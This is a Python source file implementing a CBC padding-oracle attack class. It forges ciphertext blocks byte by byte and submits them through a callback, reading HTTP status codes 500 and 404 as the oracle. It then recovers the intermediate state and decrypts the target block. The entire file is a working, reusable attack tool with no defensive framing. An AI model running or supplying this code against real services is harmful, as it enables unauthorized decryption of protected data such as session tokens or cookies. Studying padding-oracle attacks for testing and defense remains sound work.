import logging
#import logmanager
import Colorer

def xord(string_one, string_two):
    output = ""
    for i, j in zip(string_one, string_two):
        output += chr( ord(i) ^ ord(j) )
    return output

class PaddingAttack(object):
    """
    Perform a padding attack using a single block of crafted
    ciphertext
    """
    def __init__(self, enc_block, IV, callback, blocklen=16):
        self.enc_block = enc_block
        self.IV = IV
        self.callback = callback
        self.blocklen = blocklen
        self.logger = logging.getLogger(__name__)


    def attack(self):
        intermediate_bytes = []
        decrypted_bytes = []
        pos = 1
        while pos <= self.blocklen:
            data = "\x00" * (self.blocklen-pos) + chr(pos) * pos
            for i in range(1, 0xff+1):
                temp = map(chr, intermediate_bytes)
                data = data[:self.blocklen-pos] + chr(i) + xord(temp, [chr(pos)]*len(intermediate_bytes))
                data += self.enc_block
                return_code = self.callback(data)
                if return_code == 200:
                    self.logger.debug("[200] Valid decryption obtained.")
                elif return_code == 500:
                    #self.logger.debug("[500], invalid padding.")
                    continue
                elif return_code == 404:
                    self.logger.debug("[404], valid padding, invalid decryption.")
                    byte = pos ^ i
                    intermediate_bytes.insert(0, byte)
                    decrypted_bytes.insert(0, byte^ord(self.IV[-pos]))
                    self.logger.debug("Intermediate bytes found to be" + repr(intermediate_bytes))
                    self.logger.debug("Decrypted bytes so far" + repr(decrypted_bytes))
                    break
            pos += 1

        decrypted_bytes = ''.join(map(chr, decrypted_bytes))
        self.logger.debug("Fully Decrypted data - " + repr(decrypted_bytes))
        return decrypted_bytes
